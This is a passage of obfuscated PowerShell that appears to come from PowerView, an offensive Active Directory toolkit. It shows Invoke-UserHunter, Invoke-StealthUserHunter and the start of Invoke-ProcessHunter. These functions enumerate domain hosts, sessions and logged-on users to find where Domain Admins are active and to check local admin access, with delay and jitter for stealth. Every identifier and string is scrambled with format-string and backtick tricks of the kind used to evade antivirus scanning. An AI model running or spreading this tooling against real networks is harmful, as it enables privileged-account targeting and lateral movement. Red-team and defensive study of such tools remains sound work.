                ${Ps} +=   ( &("{0}{1}"-f'gC','i') VArIABle:b7Fic  ).VAlUe::("{2}{1}{0}"-f 'te','a','cre').Invoke()

                ${Ps}[${co`U`NtEr}]."RUNsPAce`P`OOl" = ${pO`Ol}

                
                ${N`UlL} = ${PS}[${cO`UnTER}].("{1}{2}{0}"-f 'pt','AddS','cri').Invoke(${sCript`B`LOcK}).("{0}{1}{3}{2}" -f'Ad','dParamet','r','e').Invoke(("{2}{0}{1}" -f 'erNam','e','Comput'), ${c`oMput`Er})
                if(${Sc`RipTPAR`AME`TERS}) {
                    ForEach (${PAR`AM} in ${SC`R`ipT`P`ARAme`TeRS}.("{0}{3}{1}{2}{4}"-f'Ge','Enu','merat','t','or').Invoke()) {
                        ${n`Ull} = ${P`s}[${C`OuN`TEr}].("{2}{0}{1}"-f'e','r','AddParamet').Invoke(${pAr`AM}."NA`me", ${p`A`RAm}."V`Alue")
                    }
                }

                
                ${J`OBS} += ${p`S}[${c`OuN`Ter}].("{1}{0}{2}"-f'nInvo','Begi','ke').Invoke();

                
                ${w`AiT} += ${jO`Bs}[${C`OUnT`eR}]."asYnC`WAithan`D`LE"
            }
            ${co`UnT`Er} = ${c`O`UnteR} + 1
        }
    }

    end {

        &("{1}{2}{0}"-f'ose','W','rite-Verb') ("{4}{2}{1}{0}{7}{3}{5}{6}" -f'ning',' scan','or','o ','Waiting f','f','inish...',' threads t')

        ${WA`iT`Ti`mEOut} = &("{1}{0}{2}"-f'at','Get-D','e')

        
        while ($(${jO`Bs} | &("{0}{1}{2}"-f'Where-','Objec','t') {${_}."ISC`omPlE`TED" -eq ${fa`Lse}})."co`UNT" -gt 0 -or $($($(&("{1}{2}{0}" -f't-Date','G','e')) - ${waiTti`M`E`OUt})."TOTaLse`C`ondS") -gt 60) {
                &("{1}{0}{3}{2}" -f 'r','Sta','eep','t-Sl') -MilliSeconds 500
            }

        
        for (${y} = 0; ${Y} -lt ${coUNT`eR}; ${Y}++) {

            try {
                
                ${Ps}[${Y}]."eNdin`VoKe"(${J`oBs}[${Y}])

            } catch {
                &("{2}{0}{1}" -f'rite-','Warning','W') ('err'+'or: '+"$_")
            }
            finally {
                ${p`s}[${y}].("{2}{1}{0}"-f 'e','spos','Di').Invoke()
            }
        }
        
        ${P`OOL}.("{1}{0}"-f 'ose','Disp').Invoke()
        &("{2}{0}{1}" -f 'bo','se','Write-Ver') ("{1}{3}{2}{5}{0}{4}"-f'd','All thr',' co','eads','!','mplete')
    }
}


function InVoK`e-`Use`Rh`UN`TER {


    [CmdletBinding()]
    param(
        [Parameter(POsITION=0,vAlUeFroMPipElIne=${TR`Ue})]
        [Alias({"{0}{1}"-f 'H','osts'})]
        [String[]]
        ${cO`mPU`TE`RnAME},

        [ValidateScript({&("{2}{0}{1}" -f 't-Pa','th','Tes') -Path ${_} })]
        [Alias({"{1}{0}"-f 'ist','HostL'})]
        [String]
        ${Co`mp`UterfI`le},

        [String]
        ${CoMpu`TERF`il`TER},

        [String]
        ${COmp`UTeRaD`s`PaTH},

        [Switch]
        ${U`N`con`sTraINeD},

        [String]
        ${g`RoUpna`ME} = ("{0}{1}{2}"-f'D','omain A','dmins'),

        [String]
        ${T`Ar`GETs`ErvEr},

        [String]
        ${Use`Rna`ME},

        [String]
        ${Use`Rf`IlTER},

        [String]
        ${uS`ErA`dsP`AtH},

        [ValidateScript({&("{0}{2}{1}"-f'Tes','h','t-Pat') -Path ${_} })]
        [String]
        ${u`SeRf`iLe},

        [Switch]
        ${A`DmIN`c`ouNT},

        [Switch]
        ${AlLOwde`LE`GA`TIOn},

        [Switch]
        ${C`hE`ckaCCe`ss},

        [Switch]
        ${sToP`o`NS`UCCESS},

        [Switch]
        ${n`opiNG},

        [UInt32]
        ${d`elaY} = 0,

        [Double]
        ${JiTT`ER} = .3,

        [String]
        ${d`omA`iN},

        [String]
        ${D`omaI`N`ConT`RoLler},

        [Switch]
        ${S`H`OWall},

        [Switch]
        ${SearcHf`OR`eSt},

        [Switch]
        ${stE`A`LTH},

        [String]
        [ValidateSet("DFS","DC",{"{1}{0}" -f 'le','Fi'},"All")]
        ${S`T`eALT`HSoUR`ce} ="All",

        [Switch]
        ${F`oRE`iGNuSe`RS},

        [ValidateRange(1,100)] 
        [Int]
        ${Th`READs}
    )

    begin {

        if (${pS`BouN`Dpar`AMet`e`Rs}[("{0}{1}" -f 'Debu','g')]) {
            ${De`BugPr`Ef`E`REnCe} = ("{2}{1}{0}" -f'e','inu','Cont')
        }

        
        ${RA`NdNO} = &("{0}{2}{3}{1}"-f 'New-O','ct','bj','e') ("{1}{2}{0}"-f '.Random','Syste','m')

        &("{2}{1}{0}{3}" -f'bos','rite-Ver','W','e') ('['+'*] '+'Runni'+'ng '+'Invok'+'e'+'-Us'+'erHunter '+'wi'+'th '+'del'+'ay'+' '+'of'+' '+"$Delay")

        
        
        
        
        

        if(${com`p`UteRfI`LE}) {
            
            ${cOMPU`Te`R`NA`ME} = &("{1}{0}{3}{2}" -f'nt','Get-Co','t','en') -Path ${C`oMP`Ut`eRFiLE}
        }

        if(!${coM`PUTe`Rn`Ame}) { 
            [Array]${comp`UT`E`RN`AmE} = @()

            if(${d`oM`AIn}) {
                ${ta`RgetDO`mAI`Ns} = @(${doMA`In})
            }
            elseif(${SE`Arc`hfOr`ESt}) {
                
                ${T`ARgeTD`o`m`AInS} = &("{1}{0}{3}{2}" -f'et-Net','G','main','ForestDo') | &("{0}{3}{2}{1}"-f 'ForE','t','Objec','ach-') { ${_}."Na`Me" }
            }
            else {
                
                ${Ta`R`gE`TdomAI`Ns} = @( (&("{3}{0}{1}{4}{2}" -f'Dom','a','n','Get-Net','i'))."NA`me" )
            }
            
            if(${sT`Ea`lth}) {
                &("{2}{1}{0}" -f'e','rite-Verbos','W') ("{0}{5}{10}{11}{13}{8}{6}{3}{4}{1}{12}{2}{9}{7}" -f'Ste','o','sed s','m','m','a','ng co','s','i','erver','lth mode! Enum','e','nly u','rat')
                &("{0}{1}{2}" -f 'Writ','e-','Verbose') ('Stealt'+'h '+'source:'+' '+"$StealthSource")

                ForEach (${d`o`mAin} in ${TA`Rge`TdOma`ins}) {
                    if ((${S`Tea`LthS`oU`RCe} -eq ("{0}{1}" -f 'Fil','e')) -or (${Stea`l`THsOUrce} -eq "All")) {
                        &("{0}{2}{1}" -f'Write-V','se','erbo') ('[*]'+' '+'Que'+'rying'+' '+'do'+'main'+' '+"$Domain "+'fo'+'r '+'File'+' '+'Ser'+'vers.'+'..')
                        ${c`OM`pUTERnaMe} += &("{3}{2}{0}{1}" -f'tFileServ','er','t-Ne','Ge') -Domain ${D`O`MAiN} -DomainController ${Dom`AINCo`NTROlL`Er}
                    }
                    if ((${st`ea`LthSOUR`Ce} -eq "DFS") -or (${STe`A`LthSO`URcE} -eq "All")) {
                        &("{0}{2}{1}"-f'Wr','Verbose','ite-') ('['+'*] '+'Queryi'+'ng '+'d'+'omain '+"$Domain "+'fo'+'r '+'DFS'+' '+'Se'+'r'+'vers...')
                        ${COMPU`TER`N`AMe} += &("{3}{1}{2}{0}"-f'are','t-D','FSsh','Ge') -Domain ${Do`m`AiN} -DomainController ${DomA`IN`cON`TRO`ll`er} | &("{1}{4}{0}{2}{3}"-f'j','ForEac','ec','t','h-Ob') {${_}."ReMoteSe`R`VerNa`ME"}
                    }
                    if ((${StE`ALThS`o`URCe} -eq "DC") -or (${S`TEALt`hSO`URCE} -eq "All")) {
                        &("{3}{0}{2}{1}" -f 'e','e','rbos','Write-V') ('[*'+'] '+'Qu'+'e'+'rying '+'domain'+' '+"$Domain "+'for'+' '+'Dom'+'ain '+'Con'+'troller'+'s'+'.'+'..')
                        ${cOMPU`Te`RnAME} += &("{6}{5}{3}{1}{0}{4}{2}" -f 'ntroll','ainCo','r','m','e','o','Get-NetD') -LDAP -Domain ${D`O`Main} -DomainController ${do`m`A`incoNTR`oLLer} | &("{1}{0}{2}" -f 'ch','ForEa','-Object') { ${_}."Dn`SHOSTna`me"}
                    }
                }
            }
            else {
                ForEach (${do`ma`In} in ${tar`g`ETdOM`A`INs}) {
                    &("{2}{3}{1}{0}"-f 'e','os','Write-','Verb') ('[*'+'] '+'Q'+'ueryi'+'ng'+' '+'domai'+'n '+"$Domain "+'f'+'or '+'ho'+'sts')

                    ${arGu`Me`NTS} = @{
                        ("{0}{1}" -f 'Dom','ain') = ${dO`ma`In}
                        ("{2}{3}{1}{0}"-f'roller','nt','Doma','inCo') = ${doMaI`NCO`NtroLl`Er}
                        ("{1}{0}"-f 'ath','ADSp') = ${aDSPa`Th}
                        ("{1}{0}"-f 'lter','Fi') = ${C`OmPU`TeRFI`Lter}
                        ("{1}{3}{2}{0}"-f 'ned','Uncon','ai','str') = ${U`N`Co`NsTraINeD}
                    }

                    ${Com`p`UT`E`RNAmE} += &("{0}{1}{2}"-f'Get-NetComp','u','ter') @Arguments
                }
            }

            
            ${COm`P`UtErName} = ${CompUT`eRNA`Me} | &("{0}{1}{2}{3}" -f'Wh','ere-O','b','ject') { ${_} } | &("{1}{3}{0}{2}" -f'jec','Sor','t','t-Ob') -Unique | &("{2}{1}{0}" -f 'ject','-Ob','Sort') { &("{2}{1}{0}" -f 'om','-Rand','Get') }
            if($(${cOMp`UTE`RNA`mE}."Co`UnT") -eq 0) {
                throw ("{2}{0}{3}{1}"-f' f','d!','No hosts','oun')
            }
        }

        
        
        
        
        

        
        ${Ta`RGetU`SE`Rs} = @()

        
        ${CURREn`TUs`eR} = ( ${Z3`SV`BN}::"uS`erN`AmE").("{0}{2}{1}" -f'toLow','r','e').Invoke()

        
        if(${sHow`A`lL} -or ${fORe`iG`NU`seRS}) {
            ${U`SER} = &("{0}{2}{3}{1}" -f 'N','bject','ew-','O') ("{1}{0}" -f'SObject','P')
            ${u`sER} | &("{1}{0}{2}"-f'd-','Ad','Member') ("{2}{0}{1}"-f 'otepro','perty','N') ("{2}{0}{1}" -f'rDo','main','Membe') ${n`UlL}
            ${Us`ER} | &("{1}{0}{2}" -f 'd-Mem','Ad','ber') ("{3}{0}{2}{1}"-f'tepro','erty','p','No') ("{1}{2}{0}"-f 'me','Memb','erNa') '*'
            ${TAr`GE`TUs`ERS} = @(${u`SeR})

            if(${fo`REIg`NuSE`RS}) {
                
                ${K`RbTgTN`A`ME} = &("{1}{4}{2}{0}{3}"-f 'nonicalt','Conve','a','oNT4','rt-C') -ObjectName "krbtgt@$($Domain)"
                ${do`MaIN`SHo`R`TnAme} = ${k`RBTg`TN`Ame}.("{1}{0}" -f'lit','sp').Invoke("\")[0]
            }
        }
        
        elseif(${taR`Ge`TsE`RV`er}) {
            &("{1}{3}{2}{0}" -f 'bose','Write','r','-Ve') ('Qu'+'ery'+'ing'+' '+'targe'+'t '+'s'+'erver '+"'$TargetServer' "+'for'+' '+'l'+'oc'+'al '+'user'+'s')
            ${ta`R`getuS`eRS} = &("{0}{1}{2}{3}"-f 'Get-','NetLocal','G','roup') ${T`A`Rge`TseR`Ver} -Recurse | &("{1}{2}{0}"-f 'ct','Where','-Obje') {(-not ${_}."I`sGRoUp") -and ${_}."Is`d`Omain" } | &("{2}{3}{1}{4}{0}"-f 'ect','-O','Fo','rEach','bj') {
                ${uS`Er} = &("{0}{2}{1}" -f'Ne','-Object','w') ("{0}{1}" -f 'PSO','bject')
                ${u`SEr} | &("{2}{0}{1}"-f'emb','er','Add-M') ("{2}{0}{1}" -f't','y','Noteproper') ("{0}{1}{2}" -f'MemberD','o','main') (${_}."aCC`Ou`NTnaME").("{0}{1}" -f 's','plit').Invoke("/")[0].("{2}{1}{0}"-f 'r','Lowe','to').Invoke() 
                ${Us`Er} | &("{2}{0}{1}" -f'm','ber','Add-Me') ("{3}{2}{1}{0}"-f 'erty','p','tepro','No') ("{0}{2}{1}"-f'M','e','emberNam') (${_}."A`ccOUn`TN`Ame").("{1}{0}"-f 'lit','sp').Invoke("/")[1].("{1}{0}{2}"-f'oLow','t','er').Invoke() 
                ${u`ser}
            }  | &("{0}{3}{1}{2}"-f 'W','e-Objec','t','her') {${_}}
        }
        
        elseif(${US`E`RNaMe}) {
            &("{0}{1}{3}{2}" -f'Writ','e-V','se','erbo') ('[*]'+' '+'U'+'sing '+'t'+'arget'+' '+'use'+'r '+"'$UserName'...")
            ${u`seR} = &("{2}{1}{0}" -f 'Object','ew-','N') ("{0}{1}{2}" -f'PSOb','j','ect')
            if(${t`Arge`TdoMAi`NS}) {
                ${Us`Er} | &("{1}{0}{2}"-f 'd-Memb','Ad','er') ("{2}{0}{1}"-f'op','erty','Notepr') ("{3}{1}{0}{2}" -f'r','e','Domain','Memb') ${Targ`etD`omAINS}[0]
            }
            else {
                ${Us`ER} | &("{0}{1}{2}" -f'Add-Mem','b','er') ("{3}{0}{1}{2}" -f 'ot','eprope','rty','N') ("{3}{0}{1}{2}"-f 'Doma','i','n','Member') ${nU`lL}
            }
            ${us`ER} | &("{1}{0}{2}"-f'-Me','Add','mber') ("{1}{3}{2}{0}"-f 'erty','N','prop','ote') ("{1}{0}{2}" -f'rNa','Membe','me') ${USe`RnA`Me}.("{2}{1}{0}" -f'Lower','o','T').Invoke()
            ${T`AR`GETUSeRs} = @(${us`er})
        }
        
        elseif(${UsEr`FI`le}) {
            ${TARGEtU`s`E`RS} = &("{3}{1}{2}{0}" -f 'nt','Co','nte','Get-') -Path ${UsE`RFi`Le} | &("{2}{0}{3}{1}" -f'-O','ject','ForEach','b') {
                ${US`ER} = &("{0}{3}{1}{2}" -f'N','ec','t','ew-Obj') ("{0}{1}" -f'PSObje','ct')
                if(${T`ArGeTDOm`AInS}) {
                    ${uS`ER} | &("{2}{0}{3}{1}" -f'dd-Me','ber','A','m') ("{2}{0}{1}{3}"-f'e','p','Not','roperty') ("{2}{1}{0}"-f 'ain','berDom','Mem') ${TargeT`domai`Ns}[0]
                }
                else {
                    ${u`SEr} | &("{1}{0}{2}"-f'e','Add-Memb','r') ("{3}{1}{2}{0}"-f 'ty','eprope','r','Not') ("{2}{0}{1}{3}" -f'em','berDomai','M','n') ${NU`ll}
                }
                ${u`SEr} | &("{1}{0}{2}" -f'Mem','Add-','ber') ("{0}{1}{3}{2}" -f'Not','e','ty','proper') ("{2}{1}{0}{3}"-f 'm','erNa','Memb','e') ${_}
                ${uS`Er}
            }  | &("{3}{1}{2}{0}" -f 'ct','ere-Obj','e','Wh') {${_}}
        }
        elseif(${useRad`Sp`Ath} -or ${U`seRf`iLtER} -or ${adMiN`C`OUnT}) {
            ForEach (${DOM`A`In} in ${TA`R`gEtD`oMaiNs}) {

                ${aR`guME`NtS} = @{
                    ("{0}{1}" -f'Domai','n') = ${DO`mA`in}
                    ("{3}{2}{1}{4}{0}"-f 'ler','ontro','omainC','D','l') = ${dOmA`In`c`ONTROLl`er}
                    ("{1}{0}"-f 'Spath','AD') = ${U`SeraD`SPa`Th}
                    ("{1}{0}" -f'r','Filte') = ${Us`erFiLT`eR}
                    ("{1}{0}{2}"-f'C','Admin','ount') = ${adMI`NCoU`Nt}
                    ("{3}{1}{2}{0}"-f 'ation','llowD','eleg','A') = ${ALlo`WDELE`GA`TI`oN}
                }

                &("{0}{2}{3}{1}"-f'Write','e','-Verb','os') ('['+'*] '+'Query'+'i'+'ng '+'do'+'main'+' '+"$Domain "+'fo'+'r '+'use'+'rs')
                ${TArG`eT`USErs} += &("{1}{0}{2}{3}"-f 't-','Ge','NetUse','r') @Arguments | &("{1}{3}{0}{4}{2}"-f'rEach-','F','ect','o','Obj') {
                    ${US`ER} = &("{0}{2}{1}" -f'Ne','bject','w-O') ("{2}{0}{1}" -f 'j','ect','PSOb')
                    ${US`eR} | &("{0}{2}{3}{1}" -f'A','Member','d','d-') ("{3}{1}{0}{2}" -f'e','p','rty','Notepro') ("{0}{3}{2}{1}"-f 'Me','n','i','mberDoma') ${D`OMaIn}
                    ${Us`er} | &("{0}{1}{2}"-f 'Add','-','Member') ("{0}{2}{1}{3}" -f 'Not','r','eprope','ty') ("{0}{2}{1}" -f 'Member','ame','N') ${_}."sa`ma`Cc`ounTNaMe"
                    ${us`Er}
                }  | &("{0}{2}{1}"-f 'W','Object','here-') {${_}}

            }            
        }
        else {
            ForEach (${do`M`AIn} in ${tARGE`TDoM`Ai`Ns}) {
                &("{1}{0}{2}{3}" -f'e-Ver','Writ','bo','se') ('[*'+'] '+'Qu'+'erying'+' '+'dom'+'a'+'in '+"$Domain "+'fo'+'r '+'user'+'s'+' '+'o'+'f '+'grou'+'p '+"'$GroupName'")
                ${TaRgE`T`USE`Rs} += &("{5}{0}{4}{1}{3}{2}" -f 'et-','tGroupMem','r','be','Ne','G') -GroupName ${grO`UpN`A`ME} -Domain ${d`OMaIn} -DomainController ${DOMaInc`On`TR`oL`LeR}
            }
        }

        if (( (-not ${sh`O`WALl}) -and (-not ${FO`REIG`Nu`serS}) ) -and ((!${targ`et`USeRS}) -or (${T`ARgETU`seRS}."cOu`Nt" -eq 0))) {
            throw ("{8}{0}{9}{5}{4}{7}{1}{3}{6}{2}{10}"-f '!','d ','f','to se',' ','ers','arch ','foun','[','] No us','or!')
        }

        
        ${HOsT`EN`UMBLO`CK} = {
            param(${Com`P`UTe`RnaMe}, ${P`iNG}, ${tA`RGe`TuS`ers}, ${Cu`RREn`TUSER}, ${S`TEAL`Th}, ${DOm`AInSh`o`R`TNaMe})

            
            ${uP} = ${t`RuE}
            if(${P`iNg}) {
                ${u`P} = &("{4}{1}{0}{2}{3}"-f'Conne','t-','c','tion','Tes') -Count 1 -Quiet -ComputerName ${CoMPutE`R`N`AME}
            }
            if(${up}) {
                if(!${dOm`A`Ins`hO`RTname}) {
                    
                    ${s`E`Ss`IonS} = &("{2}{1}{0}" -f'sion','NetSes','Get-') -ComputerName ${C`O`Mpu`TE`RnamE}
                    ForEach (${Sess`I`ON} in ${SesS`I`oNS}) {
                        ${US`eRn`AmE} = ${ses`SiON}."sES`i10_uSerN`AmE"
                        ${cN`Ame} = ${se`s`SIoN}."SesI`10_cna`mE"

                        if(${c`NaMe} -and ${C`NAme}.("{0}{2}{1}"-f'StartsWi','h','t').Invoke("\\")) {
                            ${cN`Ame} = ${cNA`ME}.("{1}{2}{0}"-f 't','TrimSta','r').Invoke("\")
                        }

                        
                        if ((${UsE`R`NAme}) -and (${us`eR`Name}.("{1}{0}" -f 'm','tri').Invoke() -ne '') -and (!(${uS`eRNaME} -match ${CuRRe`Nt`USer}))) {

                            ${tArGet`U`se`RS} | &("{1}{2}{3}{0}" -f'bject','Whe','re-','O') {${u`Se`RnaMe} -like ${_}."mE`mbern`Ame"} | &("{3}{1}{0}{2}{4}" -f'h-Obj','orEac','ec','F','t') {

                                ${I`P} = &("{0}{2}{1}" -f 'Get-IPA','ess','ddr') -ComputerName ${COmP`UteR`NaMe}
                                ${fou`ND`USeR} = &("{0}{2}{1}" -f'New-','ject','Ob') ("{0}{1}"-f'P','SObject')
                                ${fOU`NDu`seR} | &("{2}{0}{1}" -f 'm','ber','Add-Me') ("{0}{3}{2}{1}" -f 'N','roperty','tep','o') ("{1}{2}{3}{0}" -f'n','UserD','om','ai') ${_}."mE`m`BerdOM`AIN"
                                ${f`oUND`U`sER} | &("{2}{1}{0}" -f'ember','M','Add-') ("{0}{2}{1}"-f'N','teproperty','o') ("{1}{2}{0}"-f'ame','U','serN') ${uSe`RNa`Me}
                                ${F`oundU`SER} | &("{2}{1}{0}"-f 'er','emb','Add-M') ("{0}{1}{2}" -f 'Noteprope','r','ty') ("{2}{0}{1}" -f 'te','rName','Compu') ${CO`m`p`UTERn`AMe}
                                ${Fo`UNDUS`ER} | &("{0}{2}{1}{3}" -f 'Add-','b','Mem','er') ("{1}{0}{2}{3}"-f 'tepro','No','pe','rty') 'IP' ${IP}
                                ${f`OUnDu`SEr} | &("{0}{2}{1}"-f'Add-Me','er','mb') ("{3}{0}{2}{1}"-f'ote','operty','pr','N') ("{2}{1}{0}{3}"-f'onF','essi','S','rom') ${Cna`me}

                                
                                if (${cHeC`kacC`ESs}) {
                                    ${ADM`in} = &("{0}{1}{4}{5}{6}{3}{2}" -f'Invo','ke-Chec','ccess','AdminA','kL','o','cal') -ComputerName ${cNA`me}
                                    ${fOUNd`Us`er} | &("{3}{1}{0}{2}" -f 'em','dd-M','ber','A') ("{1}{0}{2}"-f 'er','Noteprop','ty') ("{2}{0}{1}{3}" -f 'calAd','m','Lo','in') ${aDm`In}
                                }
                                else {
                                    ${fouNdu`S`ER} | &("{3}{2}{1}{0}" -f'ember','d-M','d','A') ("{2}{0}{1}" -f'prope','rty','Note') ("{0}{2}{1}" -f'Lo','alAdmin','c') ${N`ULL}
                                }
                                ${FO`U`Nduser}
                            }
                        }                                    
                    }
                }
                if(!${S`TEAL`Th}) {
                    
                    ${LoG`GEdoN} = &("{1}{4}{3}{2}{0}" -f 'n','Get-Net','do','ogge','L') -ComputerName ${CoM`puTER`NaME}
                    ForEach (${Us`eR} in ${L`OGge`don}) {
                        ${usEr`NA`Me} = ${us`er}."w`kUi1`_`USErnAmE"
                        
                        
                        ${us`ER`d`oMaIn} = ${U`SER}."wkUI1`_LoGOn`_`DOMaIn"

                        
                        if ((${US`erNA`ME}) -and (${U`ser`NaMe}.("{1}{0}"-f'rim','t').Invoke() -ne '')) {

                            ${tAR`G`E`TuSeRs} | &("{0}{2}{1}" -f 'Where-','ject','Ob') {${u`S`eRnAMe} -like ${_}."M`eMb`erNaME"} | &("{0}{1}{3}{2}" -f'F','orEach-O','ect','bj') {

                                ${P`Ro`cEEd} = ${t`RUE}
                                if(${dOM`A`I`N`ShOr`TnAme}) {
                                    if (${DomAInsh`ORT`N`Ame}.("{0}{1}" -f'T','oLower').Invoke() -ne ${u`seR`doma`In}.("{0}{1}" -f'T','oLower').Invoke()) {
                                        ${PRO`cEED} = ${t`Rue}
                                    }
                                    else {
                                        ${pR`oc`eEd} = ${f`Al`se}
                                    }
                                }
                                if(${pR`o`ceeD}) {
                                    ${iP} = &("{0}{1}{2}"-f 'Get','-','IPAddress') -ComputerName ${CO`mp`Ute`RnAme}
                                    ${F`Ou`NdUS`ER} = &("{2}{1}{0}" -f 't','ec','New-Obj') ("{2}{0}{1}"-f 'je','ct','PSOb')
                                    ${fo`U`NDUSER} | &("{2}{0}{1}" -f 'Memb','er','Add-') ("{1}{3}{2}{0}" -f'y','Note','ropert','p') ("{1}{2}{0}"-f 'main','Use','rDo') ${U`SerdOma`In}
                                    ${fou`N`d`USeR} | &("{0}{3}{1}{2}"-f'Add','e','mber','-M') ("{2}{0}{1}" -f'rope','rty','Notep') ("{0}{1}{2}"-f'Use','rNa','me') ${US`ERNa`ME}
                                    ${f`oUNDU`Ser} | &("{2}{1}{0}"-f'mber','dd-Me','A') ("{2}{0}{1}{3}" -f 'p','rop','Note','erty') ("{0}{2}{3}{1}" -f'Compu','e','t','erNam') ${co`MpU`Te`RnamE}
                                    ${FoU`Ndu`seR} | &("{1}{0}{2}"-f'e','Add-Memb','r') ("{1}{2}{0}{3}" -f'pr','N','ote','operty') 'IP' ${ip}
                                    ${FO`UnDU`Ser} | &("{1}{2}{0}"-f'r','Add-M','embe') ("{0}{1}{2}"-f 'Not','epropert','y') ("{0}{2}{1}" -f'Session','rom','F') ${N`ULl}

                                    
                                    if (${ch`eC`kAcc`Ess}) {
                                        ${A`dMIn} = &("{5}{4}{1}{2}{3}{0}"-f'cess','ocal','Ad','minAc','kL','Invoke-Chec') -ComputerName ${c`OmP`UTEr`NamE}
                                        ${fO`Und`USer} | &("{2}{0}{1}"-f'mb','er','Add-Me') ("{2}{1}{0}" -f'rty','rope','Notep') ("{3}{2}{1}{0}"-f 'min','lAd','a','Loc') ${a`DmiN}
                                    }
                                    else {
                                        ${FOUND`Us`er} | &("{1}{2}{0}" -f'Member','Ad','d-') ("{2}{1}{0}"-f 'ty','teproper','No') ("{0}{2}{1}"-f'LocalA','min','d') ${n`ULL}
                                    }
                                    ${fO`UN`DuSeR}
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if(${ThRE`A`ds}) {
            &("{3}{0}{2}{4}{1}" -f 'ite-Verb','e','o','Wr','s') ('U'+'sing '+'th'+'rea'+'d'+'ing '+'wi'+'th '+'thr'+'ea'+'ds '+'= '+"$Threads")

            
            ${s`Cri`PTpA`RAMS} = @{
                ("{0}{1}"-f'P','ing') = $(-not ${NOP`ING})
                ("{2}{0}{1}" -f 'arget','Users','T') = ${TaRgE`Tu`SeRs}
                ("{3}{2}{0}{1}"-f 'e','ntUser','rr','Cu') = ${c`UrreNT`US`ER}
                ("{0}{1}{2}"-f'S','t','ealth') = ${StE`Al`Th}
                ("{2}{1}{0}{3}" -f'am','mainShortN','Do','e') = ${Do`MaINsh`oRt`NAmE}
            }

            
            &("{2}{1}{4}{0}{3}{5}"-f'aded','T','Invoke-','Funct','hre','ion') -ComputerName ${CO`mPU`TeR`Name} -ScriptBlock ${ho`STE`N`UMbLOCK} -ScriptParameters ${S`C`RIp`TParams}
        }

        else {
            if(-not ${no`PI`Ng} -and (${coM`p`UtErNaMe}."c`OUnT" -ne 1)) {
                
                ${pI`NG} = {param(${CO`mPut`E`RName}) if(&("{1}{0}{2}" -f'est','T','-Connection') -ComputerName ${COM`p`UtERna`Me} -Count 1 -Quiet -ErrorAction ("{1}{0}"-f 'p','Sto')){${c`oMpU`T`eRnAmE}}}
                ${cOmPuT`E`RnA`mE} = &("{4}{1}{2}{0}{3}"-f 'u','Threa','dedF','nction','Invoke-') -NoImports -ComputerName ${c`ompUtE`Rn`AMe} -ScriptBlock ${pI`NG} -Threads 100
            }

            &("{1}{2}{0}" -f 'se','W','rite-Verbo') "[*] Total number of active hosts: $($ComputerName.count) "
            ${CO`UN`Ter} = 0

            ForEach (${c`om`PUT`Er} in ${coMpuT`eRna`ME}) {

                ${CO`U`NTer} = ${cou`NtEr} + 1

                
                &("{1}{2}{0}" -f 'p','Start-Sl','ee') -Seconds ${RAn`Dno}.("{1}{0}" -f 'ext','N').Invoke((1-${j`iTt`Er})*${d`El`Ay}, (1+${J`IT`TeR})*${Del`Ay})

                &("{0}{2}{1}"-f'W','rbose','rite-Ve') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count)) "
                ${Re`sU`lT} = &("{0}{1}{2}{4}{3}" -f 'Inv','ok','e-C','mmand','o') -ScriptBlock ${HOST`e`N`UMbloCK} -ArgumentList ${co`mPut`er}, ${fa`l`SE}, ${t`ARg`E`TuSErs}, ${CuR`ReN`Tus`er}, ${StE`AltH}, ${doMaI`NsH`O`Rtna`mE}
                ${r`eSu`LT}

                if(${RE`sU`Lt} -and ${s`ToP`O`NS`UcCeSs}) {
                    &("{0}{2}{1}"-f'Wr','ose','ite-Verb') ("{6}{4}{3}{2}{5}{9}{7}{8}{0}{1}"-f'l','y','et u','arg','*] T','ser fou','[',', returning e','ar','nd')
                    return
                }
            }
        }

    }
}


function I`NVoKE-S`TeaLThu`Ser`hUN`T`ER {
    [CmdletBinding()]
    param(
        [Parameter(POsiTION=0,vALuEFrOmpIpeLiNE=${Tr`UE})]
        [Alias({"{1}{0}"-f 'sts','Ho'})]
        [String[]]
        ${CO`m`Pu`TERNamE},

        [ValidateScript({&("{0}{2}{1}"-f 'Test-Pa','h','t') -Path ${_} })]
        [Alias({"{1}{2}{0}"-f'ist','Hos','tL'})]
        [String]
        ${coMp`UTeRfI`le},

        [String]
        ${c`omp`U`Ter`FilTer},

        [String]
        ${co`MP`UTErAdSpa`Th},

        [String]
        ${Gr`ou`pNAME} = ("{1}{0}{2}" -f'ain ','Dom','Admins'),

        [String]
        ${Ta`RG`EtsEr`Ver},

        [String]
        ${uSER`NAMe},

        [String]
        ${USErf`IL`TeR},

        [String]
        ${U`Se`RAdSp`ATh},

        [ValidateScript({&("{3}{1}{2}{0}" -f 'th','e','st-Pa','T') -Path ${_} })]
        [String]
        ${Use`Rfile},

        [Switch]
        ${cHE`CK`AccEsS},

        [Switch]
        ${STOP`o`NSUccEss},

        [Switch]
        ${n`oP`inG},

        [UInt32]
        ${dE`lAY} = 0,

        [Double]
        ${J`iTT`ER} = .3,

        [String]
        ${dOMa`IN},

        [Switch]
        ${sho`w`AlL},

        [Switch]
        ${sE`ARCh`For`eSt},

        [String]
        [ValidateSet("DFS","DC",{"{0}{1}" -f 'F','ile'},"All")]
        ${s`T`eA`LthS`oURcE} ="All"
    )
    
    &("{0}{4}{3}{2}{1}"-f'Invoke-','ter','n','serHu','U') -Stealth @PSBoundParameters
}


function InVOK`e`-prOces`SHuNT`eR {


    [CmdletBinding()]
    param(
        [Parameter(PoSiTiON=0,vaLUEFroMPipelINe=${t`RuE})]
        [Alias({"{0}{1}" -f'H','osts'})]
        [String[]]
        ${CoMp`UtER`NA`mE},

        [ValidateScript({&("{2}{0}{1}{3}" -f 's','t-Pa','Te','th') -Path ${_} })]
        [Alias({"{2}{0}{1}"-f 'tL','ist','Hos'})]
        [String]
        ${c`OMp`UTEr`FiLE},

        [String]
        ${CO`mpuTe`RFiLT`ER},

        [String]
        ${cOM`puTE`RAdsp`ATH},

        [String]
        ${pROC`Es`s`Name},

        [String]
        ${GRou`P`N`Ame} = ("{1}{3}{2}{0}"-f 's','Domai','min','n Ad'),

        [String]
        ${tAR`gE`T`SErVeR},

        [String]
        ${UseR`NA`ME},

        [String]
        ${uSeRFI`L`TEr},

        [String]
        ${uS`eRAD`sPATH},

        [ValidateScript({&("{1}{2}{0}"-f'h','T','est-Pat') -Path ${_} })]
        [String]
        ${u`SEr`FILe},

        [String]
        ${rEMo`Teuse`R`Na`Me},

        [String]
        ${R`eMotePaSs`W`ORD},

        [Switch]
        ${StoPo`NsuccE`SS},

        [Switch]
        ${NoPI`NG},

        [UInt32]
        ${DeL`AY} = 0,

        [Double]
